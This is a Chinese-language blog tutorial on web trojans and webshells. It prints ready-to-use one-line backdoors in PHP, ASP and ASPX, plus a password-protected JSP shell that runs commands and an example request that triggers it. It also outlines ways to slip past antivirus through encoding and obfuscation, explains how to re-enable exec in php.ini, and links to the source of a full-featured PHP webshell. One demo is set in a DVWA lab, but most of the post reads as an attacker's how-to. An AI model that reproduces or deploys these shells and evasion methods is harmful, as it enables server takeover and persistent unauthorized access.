---
title: 木马详解
date: 2023-07-11 09:42:24
updated: 2023-07-11 09:42:24
tags: [网络安全，木马]
categories: 网络安全
keywords: 木马
description:
top_img:
comments:
cover:
toc:
toc_number:
toc_style_simple:
copyright:
copyright_author:
copyright_author_href:
copyright_url:
copyright_info:
mathjax:
katex:
aplayer:
highlight_shrink:
aside:
---

# 最全木马详解

简单木马种类：asp、php、jsp、aspx
变形木马：htaccess，cer
先来看看最简单的一句话木马：
   <?php @eval($_POST['attack']);?>
- 代码解释：
1. @表示后面即使执行错误，也不报错：由于一个变量没有定义，就被拿去使用了，服务器就善意的提醒：Notice，你的xxx变量没有定义，会暴露密码，所以我们加上@
2. eval（）函数表示括号内的语句字符串什么的全都当做代码执行。想执行什么代码，就把什么代码放进变量attack位置下。如果想查看目标硬盘内容，可以用php函数：opendir()和readdir()等等。想上传内容就用php函数：move_uploaded_file。想执行cmd命令，则用exec()。前提是php配置文件php.ini里，关掉安全模式safe_mode = off，然后再看看禁用函数列表 disable_functions = proc_open, popen, `exec` , system, shell_exec ，把exec去掉，确保没有exec（有些cms为了方便处理某些功能，会去掉的）。
3. $_POST['attack']表示从页面中获得attack这个参数值。

- 入侵条件
1. 木马上传成功，未被杀；
2. 知道木马的路径在哪；
3. 上传的木马能正常运行。

- 常见形式
常见的一句话木马：
php的一句话木马： <?php @eval($_POST['pass']);?>
asp的一句话是：   <%eval request ("pass")%>
aspx的一句话是：  <%@ Page Language="Jscript"%> <%eval(Request.Item["pass"],"unsafe");%>
jsp的一句话是：




- 木马免杀

一般网站管理员都会安装杀毒软件，即使木马上传成功，一段时间之后也会被杀掉，所以我们要对木马进行免杀操作，把它伪装的不像一个木马躲过杀毒软件。所以我们接下来要进行木马免杀操作。

【免杀思路】：

1、将源代码进行再次编码。
2、将那一句话木马进行base64编码，存放在"乱七八糟"的代码中。
3、还是一句话木马，进行变形，只不过，这次的变形是在数组中键值对变形。很强。

小马和大马

小马和大马都是网页类型中的一种后门，是通过用来控制网站权限的，那最主要的区别就是小马是用来上传大马的。通过小马上传大马，这时候有个疑问了，那不是多此一举了，为什么要用小马来上传大马，而干嘛不直接上传大马用好了。其实这里是因为小马体积小，有比大马更强的隐蔽优势，而且有针对文件大小上传限制的漏洞，所以才有小马，小马也通常用来做留备用后门等。
网页小马

小马体积非常小，只有2KB那么大，隐蔽性也非常的好，因为小马的作用很简单，就是一个上传功能，就没有其它的了，它的作用仅仅是用来上传文件，所以也能过一些安全扫描。小马是为了方便上传大马的，因为很多漏洞做了上传限制，大马上传不了，所以就只能先上传小马，再接着通过小马上传大马了。小马还可以通过与图片合成一起通过IIS漏洞来运行。

Java语言编写的后台咱们使用JSP木马，与前面的一句话木马不同，菜刀中JSP木马较长，以下是一个简单的JSP小马：

<%
    if("123".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>



成功上传后如果能解析的话，请求：http://服务器IP:端口/Shell/cmd.jsp?pwd=123&i=ipconfig 即可执行命令。
网页大马

大马的体积就比较大了，通常在50K左右，比小马会大好多倍，但对应的功能也很强大，包括对数据的管理，命令的操作，数据库的管理，解压缩，和提权等功能，都非常强大。这种大马一旦网站被种了，网站基本就在这个大马控制之中。大马的隐蔽性不好，因为涉及很多敏感代码，安全类程序很容易扫描到。

    中国菜刀的一句话不算，菜刀一句话通过客户端来操作也非常强大，一句话的代码可以和大马实现的一样。我们这里说的小马和大马是指网页类型中的，小马就是为了配合上传大马的，这是它最主要的作用，还有就是小马可以当做备用的后门来使用，一般大马容易被发现，而小马则更容易隐藏在系统的文件夹中。

来看看一个大马利用实例：在虚拟机中往DVWA上传PHP大马（源码附在最后）:
访问木马文件123.php，提交密码123456后进入大马的功能列表，下图所示为文件管理功能：
在这里插入图片描述继续访问下命令执行功能（其他功能不展示了）：


    最后附上该PHP大马的代码（代码太长，百度云盘链接）：https://pan.baidu.com/s/1XGUp5Q_Q2zn46kcQxE5M3A


WebShell

Webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。

webshell根据脚本可以分为PHP脚本木马，ASP脚本木马，也有基于.NET的脚本木马和JSP脚本木马。在国外，还有用python脚本语言写的动态网页，当然也有与之相关的webshell。 webshell根据功能也分为大马、小马和一句话木马，例如：<%eval request(“pass”)%>通常把这句话写入一个文档里面，然后文件名改成xx.asp。然后传到服务器上面。用eval方法将request(“pass”)转换成代码执行，request函数的作用是应用外部文件。这相当于一句话木马的客户端配置。具体分类如下图：
